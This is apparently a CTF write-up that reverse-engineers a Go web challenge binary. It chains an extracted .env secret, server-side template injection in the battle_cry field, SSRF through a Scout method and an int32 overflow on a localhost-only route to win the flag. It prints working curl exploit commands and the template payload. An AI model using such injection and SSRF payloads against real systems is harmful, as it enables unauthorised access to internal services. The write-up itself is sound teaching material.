## Web — **The Soldier of God, Rick**

Author: **dimas**

Can you defeat the Soldier of God, Rick?

**TL;DR**

- extract code → found secret in env
- ssti → ssrf

**FLAG**

`C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_8690344ed976}`

**Exploration**

tmi this is my fav chall in this ctf cos i solved it right after i went home from a rev eng workshop where i learned ida so it was q satisfying lol anyway 

first i just use the provided tool to extract the binary

https://github.com/dimasma0305/Go-Embed-Extractor

```python
	┌──(myenv)─(jac㉿kali)-[~/…/CTF/2025/c2c/rick]
└─$ python3 Go-Embed-Extractor/extract_embed.py ./rick_soldier
[*] No address provided. Attempting to find embed.FS automatically...
[*] Found 12 candidate symbols:
    - main.content @ 0xccd100
    - embed.dotFile @ 0xccd108
    - net/http.httpservecontentkeepheaders @ 0xccd120
    - net/http.httplaxcontentlength @ 0xccd178
    - time.loadFromEmbeddedTZData @ 0xce3d48
    - mime/multipart.multipartfiles @ 0xccd230
    - vendor/golang.org/x/net/http2/hpack.staticTable @ 0xccd320
    - crypto/internal/hpke.SupportedKDFs @ 0xce3ff0
    - compress/flate.huffOffset @ 0xce4038
    - compress/flate.fixedOffsetEncoding @ 0xce4048
    - math/big.leafSize @ 0xc83578
    - reflect..dict.TypeFor[encoding/asn1.RawContent] @ 0x9e0bf8
[*] Auto-selecting: main.content @ 0xccd100
[+] Found pointer to slice header at: 0x9ed1a0
[+] Found files array at: 0x9ed1b8
[+] Found 6 files in the embed system.
    [-] Extracting: .env (36 bytes)
    [-] Extracting: static/ (0 bytes)
    [-] Extracting: templates/ (0 bytes)
    [-] Extracting: static/rick_soldier_sprite.png (654726 bytes)
    [-] Extracting: static/style.css (203 bytes)
    [-] Extracting: templates/index.html (4490 bytes)

[+] Extraction complete. Check folder: extracted_embed
                                                                                                                                                             
┌──(myenv)─(jac㉿kali)-[~/…/CTF/2025/c2c/rick]
└─$ ls
extracted_embed     rick_soldier      rick_soldier.id1  rick_soldier.nam  thesoldierofgodrick_thesoldierofgodrick-dist.zip
Go-Embed-Extractor  rick_soldier.id0  rick_soldier.id2  rick_soldier.til
```

at the same time i was also disassembling the binary in ida (thus why there are ida db files in the directory)

![image.png](images/image%2011.png)

immediately i notice this .env:

```python
┌──(myenv)─(jac㉿kali)-[~/…/2025/c2c/rick/extracted_embed]
└─$ cat .env          
SECRET_PHRASE=Morty_Is_The_Real_One
```

i also checked the other files, tho theres not much to see, just the static files:

```python
┌──(myenv)─(jac㉿kali)-[~/…/2025/c2c/rick/extracted_embed]
└─$ ls
static  templates
                                                                                                                                                             
┌──(myenv)─(jac㉿kali)-[~/…/2025/c2c/rick/extracted_embed]
└─$ cd templates         
                                                                                                                                                             
┌──(myenv)─(jac㉿kali)-[~/…/c2c/rick/extracted_embed/templates]
└─$ ls
index.html
                                                                                                                                                             
┌──(myenv)─(jac㉿kali)-[~/…/c2c/rick/extracted_embed/templates]
└─$ cat index.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Soldier of God, Rick</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/phaser@3.60.0/dist/phaser.min.js"></script>
    <link href="/static/style.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&display=swap');
    </style>
</head>
<body class="bg-black text-yellow-500 font-serif h-screen overflow-hidden relative">

    <!-- Phaser Game Container -->
    <div id="game-container" class="absolute inset-0 z-0 opacity-50"></div>

    <!-- UI Overlay -->
    <div class="absolute inset-0 z-10 flex flex-col items-center justify-center pointer-events-none">
        <h1 class="text-6xl md:text-8xl font-bold mb-4 tracking-widest text-shadow-gold text-center font-[Cinzel]">
            Soldier of God, Rick
        </h1>
        <p class="text-xl mb-8 italic text-gray-400">"I am Malenia, Blade of Miquella... and I have never known defeat." - Wait, wrong guy.</p>

        <!-- Battle Form -->
        <div class="bg-black/80 p-8 border-4 border-yellow-700 rounded-lg shadow-2xl pointer-events-auto backdrop-blur-sm max-w-lg w-full">
            <h2 class="text-2xl mb-4 text-center border-b border-yellow-800 pb-2">Challenge the Legend</h2>
            <form action="/fight" method="POST" class="flex flex-col gap-4">
                <div>
                    <label for="battle_cry" class="block text-sm font-bold mb-1 text-gray-300">Your Battle Cry</label>
                    <input type="text" id="battle_cry" name="battle_cry" 
                           class="w-full bg-gray-900 border border-yellow-600 p-2 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 rounded" 
                           placeholder="Yell something..." required>
                </div>
                <div>
                    <label for="secret" class="block text-sm font-bold mb-1 text-gray-300">Secret Key</label>
                    <input type="text" id="secret" name="secret" 
                           class="w-full bg-gray-900 border border-yellow-600 p-2 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 rounded" 
                           placeholder="Enter the secret..." required>
                </div>
                <button type="submit" 
                        class="bg-yellow-800 hover:bg-yellow-700 text-white font-bold py-3 px-6 rounded border border-yellow-500 transition-colors uppercase tracking-wider">
                    Enter the Mist
                </button>
            </form>
        </div>
    </div>

    <script>
        // Simple Phaser Game Background
        const config = {
            type: Phaser.AUTO,
            width: window.innerWidth,
            height: window.innerHeight,
            parent: 'game-container',
            physics: {
                default: 'arcade',
                arcade: {
                    gravity: { y: 0 }
                }
            },
            scene: {
                preload: preload,
                create: create,
                update: update
            }
        };

        const game = new Phaser.Game(config);
        let rick;

        function preload () {
            // Load the generated asset (we will save it as 'rick.png' in static)
            this.load.image('rick', '/static/rick_soldier_sprite.png');
        }

        function create () {
            // Add Rick in the center
            rick = this.add.sprite(this.scale.width / 2, this.scale.height / 2, 'rick');
            rick.setScale(4); // Pixel art look
            
            // Add some "Boss Aura"
            const particles = this.add.particles(0, 0, 'rick', {
                speed: 100,
                scale: { start: 1, end: 0 },
                blendMode: 'ADD',
                tint: 0xffd700
            });
            particles.startFollow(rick);
            
            // Text overhead
            this.add.text(this.scale.width/2, this.scale.height/2 - 150, 'HP: ∞', { 
                fontFamily: 'Cinzel', 
                fontSize: '32px', 
                color: '#ff0000' 
            }).setOrigin(0.5);
        }

        function update () {
            // Rick just breathes (simple float)
            rick.y += Math.sin(this.time.now / 500) * 0.5;
        }
    </script>
</body>
</html>
```

i proceed to check the routes via ida

![image.png](images/image%2012.png)

first i checked

`/fight` 

→ accepts post req with `secret` and `battle_cry`

→ verifies secret against hardcoded value → “Morty_Is_The_Real_One”

→ `battle_cry` (v27) inserted directly to template

- → `v25 = html_template__ptr_Template_Parse(v5, v4);`

→ so in here we know we can do ssti

first i tried the following payload:

```python
curl -v -X POST http://localhost:8080/fight \
     -d "secret=Morty_Is_The_Real_One" \
     -d "battle_cry={{.}}"
```

response:

```python
HTTP/1.1 200 OK
Date: Sun, 15 Feb 2026 13:27:03 GMT
Content-Length: 1872
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<snip>
        <div class="mb-6 space-y-4 text-lg">
            <p><span class="text-gray-400">You screamed:</span> <span class="text-white italic">"BattleView{Rick: Rick, Soldier of God HP:999999, LastMsg: Rick explicitly ignores your Scream. He is simply too powerful.}"</span></p>
            <snip>
   
```

the ssti is succesful 

pseudocode of /fight: 

```python
// rick/router.(*Handler).Fight
void __golang rick_router__ptr_Handler_Fight(rick_router_Handler *h, net_http_ResponseWriter w, net_http_Request *r)
{
  char v3; // al
  string_0 v4; // kr20_16
  html_template_Template *v5; // rax
  string v6; // kr30_16
  uintptr tab; // rdx
  internal_abi_Type *Type; // rbx
  __int64 Hash; // rdi
  void *v10; // rax
  error_0 v11; // kr50_16
  __int64 v12; // r8
  uintptr v13; // rdi
  uintptr Typ; // r9
  rick_interactor_GameInteractor *Interactor; // [rsp+18h] [rbp-58h]
  router_BattleView v; // [rsp+20h] [rbp-50h] BYREF
  internal_abi_ITab *wr; // [rsp+50h] [rbp-20h]
  io_Writer_0 wr_8; // [rsp+58h] [rbp-18h] BYREF
  string_0 v22; // 0:rdi.16
  interface__0 v23; // 0:rdi.16
  string_0 v24; // 0:r8.16
  retval_767D60 v25; // 0:kr00_24.24
  string_0 v27; // 0:rax.8,8:rbx.8
  string_0 v28; // 0:rax.8,8:rbx.8
  string_0 v29; // 0:rax.8,8:rbx.8
  string_0 v30; // 0:rax.8,8:rbx.8
  string_0 v31; // 0:rax.8,8:rbx.8
  string_0 v32; // 0:rcx.8,8:rdi.8
  string_0 v33; // 0:rcx.8,8:rdi.8
  string_0 v34; // 0:rcx.8,8:rdi.8
  string_0 v35; // 0:rcx.8,8:rdi.8
  _slice_interface__0 v36; // 0:rcx.8,8:rdi.16
  _slice_interface__0 v37; // 0:rcx.8,8:rdi.16
  _slice_interface__0 v38; // 0:rcx.8,8:rdi.16
  string_0 v39; // 0:rbx.8,8:rcx.8
  string_0 v40; // 0:rbx.8,8:rcx.8
  string_0 v41; // 0:rbx.8,8:rcx.8
  io_Writer_0 v42; // 0:rbx.8,8:rcx.8

  if ( r->Method.len == 4 && *(_DWORD *)r->Method.str == 1414745936 )
  {
    v39.str = (uint8 *)"secretresultScreamamountSundayMondayFridayAugustminutesecondGOROOT390625uint16uint32uint64structchan<-<-chan ValueX25519%w%.0wlengthkem_id--%s\r\nAcceptServernetdnsdomaingophertelnetreturnlisten.onionndots:sendtoip+netsocketacceptallow";
    v39.len = 6;
    if ( h->SecretPhrase.len == net_http__ptr_Request_FormValue(r, v39).len && (runtime_memequal(), v3) )
    {
      v40.str = (uint8 *)&byte_89DE7A;
      v40.len = 10;
      v27 = net_http__ptr_Request_FormValue(r, v40);
      wr_8.tab = (internal_abi_ITab *)&RTYPE_string;
      wr_8.data = runtime_convTstring(v27);
      v28.str = (uint8 *)"\n"
                         "<!DOCTYPE html>\n"
                         "<html lang=\"en\">\n"
                         "<head>\n"
                         "    <meta charset=\"UTF-8\">\n"
                         "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
                         "    <title>The Battle</title>\n"
                         "    <script src=\"https://cdn.tailwindcss.com\"></script>\n"
                         "    <link href=\"/static/style.css\" rel=\"stylesheet\">\n"
                         "</head>\n"
                         "<body class=\"bg-black text-yellow-500 font-serif min-h-screen flex flex-col items-center justi"
                         "fy-center p-4 bg-[url('/static/rick_soldier_sprite.png')] bg-cover bg-center bg-no-repeat bg-bl"
                         "end-overlay bg-black/80\">\n"
                         "    <div class=\"max-w-2xl w-full bg-black/90 p-8 border-4 border-yellow-700 rounded-lg shadow-"
                         "2xl backdrop-blur-sm\">\n"
                         "        <h1 class=\"text-4xl font-bold mb-6 text-center text-red-600 tracking-widest uppercase "
                         "border-b-2 border-red-900 pb-4\">You Died</h1>\n"
                         "        \n"
                         "        <div class=\"mb-6 space-y-4 text-lg\">\n"
                         "            <p><span class=\"text-gray-400\">You screamed:</span> <span class=\"text-white ital"
                         "ic\">\"%s\"</span></p>\n"
                         "            <p class=\"text-xl text-yellow-200\">{{ .Log.Message }}</p>\n"
                         "            \n"
                         "            <div class=\"w-full bg-gray-800 rounded-full h-4 mt-4 border border-gray-600\">\n"
                         "                <div class=\"bg-red-600 h-2.5 rounded-full\" style=\"width: 100%%\"></div>\n"
                         "            </div>\n"
                         "            <p class=\"text-right text-sm text-red-400\">Rick's HP: {{ .Rick.HP }} / ∞</p>\n"
                         "        </div>\n"
                         "\n"
                         "        {{ if .Rick.IsDead }}\n"
                         "        <div class=\"mt-8 p-6 border-2 border-yellow-500 bg-yellow-900/30 text-yellow-100 round"
                         "ed animate-pulse text-center\">\n"
                         "            <h2 class=\"text-2xl font-bold text-yellow-400 mb-2\">LEGEND FELLED</h2>\n"
                         "            <p class=\"text-sm uppercase tracking-widest mb-4\">Secret Revealed</p>\n"
                         "            <p class=\"font-mono bg-black/50 p-2 rounded border border-yellow-800 break-all\">{"
                         "{ .Secret }}</p>\n"
                         "        </div>\n"
                         "        {{ end }}\n"
                         "\n"
                         "        <div class=\"mt-8 text-center\">\n"
                         "            <a href=\"/\" class=\"inline-block bg-transparent hover:bg-yellow-900/30 text-yello"
                         "w-600 font-semibold hover:text-white py-2 px-6 border border-yellow-600 hover:border-transparen"
                         "t rounded transition-all duration-300 uppercase tracking-widest text-sm\">\n"
                         "                Return to Grace\n"
                         "            </a>\n"
                         "        </div>\n"
                         "    </div>\n"
                         "</body>\n"
                         "</html>\n"
                         "\t";
      v28.len = 2170;
      v36.array = (interface__0 *)&wr_8;
      v36.len = 1;
      v36.cap = 1;
      v4 = fmt_Sprintf(v28, v36);
      v29.str = (uint8 *)"resultScreamamountSundayMondayFridayAugustminutesecondGOROOT390625uint16uint32uint64structchan<-<-chan ValueX25519%w%.0wlengthkem_id--%s\r\nAcceptServernetdnsdomaingophertelnetreturnlisten.onionndots:sendtoip+netsocketacceptallow";
      v29.len = 6;
      v5 = html_template_New(v29);
      v25 = html_template__ptr_Template_Parse(v5, v4);
      if ( v25._r1.tab )
      {
        wr_8 = 0;
        wr_8.tab = (internal_abi_ITab *)v25._r1.tab->Type;
        wr_8.data = v25._r1.data;
        v30.str = (uint8 *)"Template Error: %v";
        v30.len = 18;
        v37.array = (interface__0 *)&wr_8;
        v37.len = 1;
        v37.cap = 1;
        v34 = fmt_Sprintf(v30, v37);
        net_http_Error(w, v34, 500);
      }
      else
      {
        Interactor = h->Interactor;
        v41.str = (uint8 *)"Rick explicitly ignores your ";
        v41.len = 29;
        v22.str = (uint8 *)"ScreamamountSundayMondayFridayAugustminutesecondGOROOT390625uint16uint32uint64structchan<-<-chan ValueX25519%w%.0wlengthkem_id--%s\r\nAcceptServernetdnsdomaingophertelnetreturnlisten.onionndots:sendtoip+netsocketacceptallow";
        v22.len = 6;
        v24.str = (uint8 *)". He is simply too powerful.";
        v24.len = 28;
        v6 = (string)runtime_concatstring3(0, v41, v22, v24);
        v.Rick = (_ptr_entity_Rick)h->Interactor->Rick;
        v.Log.Message = v6;
        v.Log.RickHP = Interactor->Rick->HP;
        v.flag = (string)h->Flag;
        tab = (uintptr)w.tab;
        if ( w.tab )
        {
          Type = w.tab->Type;
          Hash = w.tab->Hash;
          while ( 1 )
          {
            v12 = Hash;
            v13 = rick_router__typeAssert_0.Cache->Mask & Hash;
            Typ = rick_router__typeAssert_0.Cache->Entries[v13].Typ;
            if ( (internal_abi_Type *)Typ == Type )
              break;
            Hash = v12 + 1;
            if ( !Typ )
            {
              tab = (uintptr)runtime_typeAssert(&rick_router__typeAssert_0, Type);
              goto LABEL_11;
            }
          }
          tab = rick_router__typeAssert_0.Cache->Entries[v13].Itab;
        }
LABEL_11:
        wr = (internal_abi_ITab *)tab;
        v10 = runtime_convT((internal_abi_Type *)&RTYPE_router_BattleView, &v);
        v42.tab = wr;
        v42.data = w.data;
        v23._type = (internal_abi_Type *)&RTYPE_router_BattleView;
        v23.data = v10;
        v11 = html_template__ptr_Template_Execute(v25._r0, v42, v23);
        if ( v11.tab )
        {
          wr_8 = 0;
          wr_8.tab = (internal_abi_ITab *)v11.tab->Type;
          wr_8.data = v11.data;
          v31.str = (uint8 *)"Execution Error: %v";
          v31.len = 19;
          v38.array = (interface__0 *)&wr_8;
          v38.len = 1;
          v38.cap = 1;
          v35 = fmt_Sprintf(v31, v38);
          net_http_Error(w, v35, 500);
        }
      }
    }
    else
    {
      v33.str = (uint8 *)"You are not worthy. The Golden Order rejects your entry.";
      v33.len = 56;
      net_http_Error(w, v33, 403);
    }
  }
  else
  {
    v32.str = (uint8 *)"Method not allowed";
    v32.len = 18;
    net_http_Error(w, v32, 405);
  }
}
```

moving on to check other routes

`/internal/offer-runes` 

→ takes the parameter `amount` value then set it as rick’s hp

- if `amount > 0`, it sets `Rick.HP = amount`
- then it checks `if (Rick.HP > 0)`  → if false we gonna defeat

→ we can set an amount that defeats rick by doing integer overflow (gemini helped me figured this out)

- variable `v26` (amount) comes from `Atoi` (64-bit int) and `Rick.HP` is likely a 32-bit signed integer (`int32`) in the struct definition
- if we send `2147483648` (which is `2^31`, or MaxInt32 + 1):
    - `v26` (64-bit) = `2147483648` (Positive, passes the `> 0` check).
    - `Rick.HP` (32-bit) = `int32(2147483648)` → 2147483648 (Negative!)
    - `Rick.HP > 0` check fails.
    - Status becomes "Defeated"

```python
// rick/router.(*Handler).InternalOfferRunes
void __golang rick_router__ptr_Handler_InternalOfferRunes(
        rick_router_Handler *h,
        net_http_ResponseWriter w,
        net_http_Request *r)
{
  int len; // rdx
  char v4; // si
  char v5; // al
  char v6; // dl
  char v7; // al
  map<string_comma__slice_string> *v8; // rax
  internal_abi_ITab *Itab; // rdx
  internal_abi_Type *v10; // rbx
  __int64 v11; // rdx
  rick_entity_Rick *Rick; // rdx
  __int64 v13; // rsi
  _QWORD *v14; // r11
  __int64 v15; // rsi
  _QWORD *v16; // r11
  internal_abi_ITab *tab; // rdx
  internal_abi_Type *Type; // rbx
  __int64 Hash; // rdx
  __int64 v20; // r8
  uintptr v21; // rdx
  uintptr Typ; // r9
  __int64 v23; // r12
  uintptr v24; // rdx
  uintptr v25; // r13
  __int64 v26; // rax
  int v27; // [rsp+0h] [rbp-58h]
  uint64 val; // [rsp+8h] [rbp-50h]
  io_Writer_0 v29; // [rsp+18h] [rbp-40h] BYREF
  void *v30; // [rsp+28h] [rbp-30h]
  const internal_abi_Type *v31; // [rsp+30h] [rbp-28h]
  void *v32; // [rsp+38h] [rbp-20h]
  __int128 v33; // [rsp+40h] [rbp-18h]
  net_http_ResponseWriter wa; // [rsp+68h] [rbp+10h]
  net_http_Request *ra; // [rsp+78h] [rbp+20h]
  _slice_interface__0 v37; // 0:rsi.24
  _slice_interface__0 v38; // 0:rsi.24
  string_0 v39; // 0:rax.8,8:rbx.8
  net_http_ResponseWriter v40; // 0:rax.8,8:rbx.8
  string_0 Status; // 0:rax.8,8:rbx.8
  io_Writer_0 v42; // 0:rax.8,8:rbx.8
  io_Writer_0 v43; // 0:rax.8,8:rbx.8
  string_0 v44; // 0:rcx.8,8:rdi.8
  string_0 v45; // 0:rcx.8,8:rdi.8
  string_0 v46; // 0:rcx.8,8:rdi.8
  string_0 v47; // 0:rbx.8,8:rcx.8

  ra = r;
  wa = w;
  len = r->RemoteAddr.len;
  if ( len >= 9 )
  {
    v27 = r->RemoteAddr.len;
    runtime_memequal();
    w = wa;
    len = v27;
    r = ra;
    v4 = v5;
  }
  else
  {
    v4 = 0;
  }
  if ( v4 || (len >= 5 ? (runtime_memequal(), w = wa, r = ra, v6 = v7) : (v6 = 0), v6) )
  {
    v8 = net_url__ptr_URL_Query(r->URL);
    v47.str = (uint8 *)"amountSundayMondayFridayAugustminutesecondGOROOT390625uint16uint32uint64structchan<-<-chan ValueX25519%w%.0wlengthkem_id--%s\r\nAcceptServernetdnsdomaingophertelnetreturnlisten.onionndots:sendtoip+netsocketacceptallow";
    v47.len = 6;
    v39 = net_url_Values_Get(v8, v47);
    v26 = (unsigned __int64)strconv_Atoi(v39);
    if ( v26 > 0 )
    {
      h->Interactor->Rick->HP = v26;
      Rick = h->Interactor->Rick;
      if ( Rick->HP > 0 )
      {
        Rick->Status.len = 10;
        if ( *(_DWORD *)&runtime_writeBarrier.enabled )
        {
          runtime_gcWriteBarrier1();
          *v16 = v15;
        }
        Rick->Status.str = (uint8 *)"Invincibletemplates/";
      }
      else
      {
        Rick->Status.len = 8;
        if ( *(_DWORD *)&runtime_writeBarrier.enabled )
        {
          runtime_gcWriteBarrier1();
          *v14 = v13;
        }
        Rick->Status.str = (uint8 *)"DefeatedThursdaySaturdayFebruaryNovemberDecember";
      }
      val = v26;
      tab = wa.tab;
      if ( wa.tab )
      {
        Type = wa.tab->Type;
        Hash = wa.tab->Hash;
        while ( 1 )
        {
          v20 = Hash;
          v21 = rick_router__typeAssert_2.Cache->Mask & Hash;
          Typ = rick_router__typeAssert_2.Cache->Entries[v21].Typ;
          if ( (internal_abi_Type *)Typ == Type )
            break;
          Hash = v20 + 1;
          if ( !Typ )
          {
            tab = runtime_typeAssert(&rick_router__typeAssert_2, Type);
            v26 = val;
            goto LABEL_22;
          }
        }
        tab = (internal_abi_ITab *)rick_router__typeAssert_2.Cache->Entries[v21].Itab;
      }
LABEL_22:
      v29.tab = tab;
      v33 = 0;
      v29.data = (void *)&RTYPE_int;
      v30 = runtime_convT64(v26);
      v31 = &RTYPE_int;
      v32 = runtime_convT64(val);
      Status = h->Interactor->Rick->Status;
      *(_QWORD *)&v33 = &RTYPE_string;
      *((_QWORD *)&v33 + 1) = runtime_convTstring(Status);
      v42.tab = v29.tab;
      v42.data = wa.data;
      v45.str = (uint8 *)"Runes accepted. Seal shattered (Value: %d -> %d). Rick Status: %s";
      v45.len = 65;
      v37.array = (interface__0 *)&v29.data;
      v37.len = 3;
      v37.cap = 3;
      fmt_Fprintf(v42, v45, v37);
    }
    else
    {
      Itab = wa.tab;
      if ( wa.tab )
      {
        v10 = wa.tab->Type;
        v11 = wa.tab->Hash;
        while ( 1 )
        {
          v23 = v11;
          v24 = rick_router__typeAssert_1.Cache->Mask & v11;
          v25 = rick_router__typeAssert_1.Cache->Entries[v24].Typ;
          if ( (internal_abi_Type *)v25 == v10 )
            break;
          v11 = v23 + 1;
          if ( !v25 )
          {
            Itab = runtime_typeAssert(&rick_router__typeAssert_1, v10);
            goto LABEL_27;
          }
        }
        Itab = (internal_abi_ITab *)rick_router__typeAssert_1.Cache->Entries[v24].Itab;
      }
LABEL_27:
      v43.tab = Itab;
      v43.data = wa.data;
      v46.str = (uint8 *)"Runes rejected. You must offer a positive amount (> 0).";
      v46.len = 55;
      v38.array = 0;
      v38.len = 0;
      v38.cap = 0;
      fmt_Fprintf(v43, v46, v38);
    }
  }
  else
  {
    v40 = w;
    v44.str = (uint8 *)"Internal Access Only";
    v44.len = 20;
    net_http_Error(v40, v44, 403);
  }
}
```

at this point i tried to exploit as follows:

```python
curl -X POST "http://localhost:8080/internal/offer-runes?amount=2147483648"
curl -X POST http://localhost:8080/fight \
     -d "secret=Morty_Is_The_Real_One" \
     -d "battle_cry=I_WON"
```

then i got the flag, but when I tested in remote this happens:

```python
┌──(jac㉿kali)-[~/…/CTF/2025/c2c/rick]
└─$ curl -X POST "http://challenges.1pc.tf:37750/internal/offer-runes?amount=2147483648"
Internal Access Only
```

so then i just realised there’s more to bypass haha 😭

so using gdb i list all functions for `rick/entity` 

```python
pwndbg> info functions rick/entity
All functions matching regular expression "rick/entity":

File ./<autogenerated>:
1:      void type:.eq.rick/entity.Rick(rick/entity.Rick *, rick/entity.Rick *, bool);

File /app/entity/game_state.go:
26:     void rick/entity.(*Rick).IsDead;
30:     void rick/entity.(*Rick).Scout;

File rick/entity:
        static void rick/entity.(*Rick).Scout.deferwrap1;
```

just realised theres Scout

`Scout` 

looking at the pseudocode, i noticed it takes a url as an argument and performs a GET request to the url

→ `v18 = net_http__ptr_Client_Get(net_http_DefaultClient, targetURL);`

also if we were looking closely, there is an ip restriction in offer-runes that we missed earlier (hence why my payload only works in local lol)

i didnt actually see a hardcoded restriction, but assuming from length check it could be representing `127.0.0.1`

offer-runes snippet: 

```python
len = r->RemoteAddr.len;
  if ( len >= 9 )
```

psuedocode for Scout: 

```python
// rick/entity.(*Rick).Scout
string_0 __golang rick_entity__ptr_Rick_Scout(rick_entity_Rick *r, string_0 targetURL)
{
  internal_abi_ITab *tab; // rcx
  void *data; // rdx
  internal_abi_ITab *Itab; // rcx
  internal_abi_Type *Type; // rdx
  __int64 Hash; // rcx
  string_0 v9; // kr60_16
  string_0 v10; // kr90_16
  __int64 v11; // r8
  uintptr v12; // rcx
  uintptr Typ; // r9
  internal_abi_ITab *v14; // rax
  void *v15; // [rsp+12h] [rbp-40h]
  _QWORD v16[3]; // [rsp+1Ah] [rbp-38h] BYREF
  _slice_interface__0 a; // [rsp+32h] [rbp-20h] BYREF
  retval_6819E0 v18; // 0:kr00_24.24
  retval_4925C0 All; // 0:kr38_40.40
  io_Reader_0 v20; // 0:rax.8,8:rbx.8
  string_0 v21; // 0:rax.8,8:rbx.8
  string_0 v22; // 0:rax.8,8:rbx.8
  string_0 result; // 0:rax.8,8:rbx.8
  _slice_interface__0 v24; // 0:rcx.8,8:rdi.16
  _slice_interface__0 v25; // 0:rcx.8,8:rdi.16

  a.cap = 0;
  v18 = net_http__ptr_Client_Get(net_http_DefaultClient, targetURL);
  if ( v18.err.tab )
  {
    *(_OWORD *)&a.array = 0;
    a.array = (interface__0 *)v18.err.tab->Type;
    a.len = (int)v18.err.data;
    v21.str = (uint8 *)"Scout failed: %v";
    v21.len = 16;
    v24.array = (interface__0 *)&a;
    v24.len = 1;
    v24.cap = 1;
    v9 = fmt_Sprintf(v21, v24);
    result.len = v9.len;
    result.str = v9.str;
  }
  else
  {
    tab = v18.resp->Body.tab;
    data = v18.resp->Body.data;
    v16[0] = rick_entity__ptr_Rick_Scout_deferwrap1;
    v16[1] = tab;
    v16[2] = data;
    a.cap = (int)v16;
    Itab = v18.resp->Body.tab;
    v20.data = v18.resp->Body.data;
    if ( Itab )
    {
      Type = Itab->Type;
      Hash = Itab->Hash;
      while ( 1 )
      {
        v11 = Hash;
        v12 = rick_entity__typeAssert_0.Cache->Mask & Hash;
        Typ = rick_entity__typeAssert_0.Cache->Entries[v12].Typ;
        if ( (internal_abi_Type *)Typ == Type )
          break;
        Hash = v11 + 1;
        if ( !Typ )
        {
          v15 = v18.resp->Body.data;
          v14 = runtime_typeAssert(&rick_entity__typeAssert_0, Type);
          v20.data = v15;
          Itab = v14;
          goto LABEL_5;
        }
      }
      Itab = (internal_abi_ITab *)rick_entity__typeAssert_0.Cache->Entries[v12].Itab;
    }
LABEL_5:
    v20.tab = Itab;
    All = io_ReadAll(v20);
    if ( All._r1.tab )
    {
      *(_OWORD *)&a.array = 0;
      a.array = (interface__0 *)All._r1.tab->Type;
      a.len = (int)All._r1.data;
      v22.str = (uint8 *)"Scout returned but failed to read body: %v";
      v22.len = 42;
      v25.array = (interface__0 *)&a;
      v25.len = 1;
      v25.cap = 1;
      v10 = fmt_Sprintf(v22, v25);
    }
    else
    {
      v10 = runtime_slicebytetostring(0, All._r0.array, All._r0.len);
    }
    (*(void (**)(void))a.cap)();
    result.len = v10.len;
    result.str = v10.str;
  }
  return result;
}
```

So combining everything we knew, we can obtain the flag by sending a post request like so:

```python
┌──(jac㉿kali)-[~/…/CTF/2025/c2c/rick]
└─$ curl -X POST http://challenges.1pc.tf:44004/fight \
     -d "secret=Morty_Is_The_Real_One" \
     -d "battle_cry={{.Rick.Scout+\"http%3a//127.0.0.1%3a8080/internal/offer-runes%3famount%3d2147483648\"}}"
```

**Exploit command to reproduce**

```python
curl -X POST http://challenges.1pc.tf:44004/fight \
     -d "secret=Morty_Is_The_Real_One" \
     -d "battle_cry={{.Rick.Scout+\"http%3a//127.0.0.1%3a8080/internal/offer-runes%3famount%3d2147483648\"}}"
```
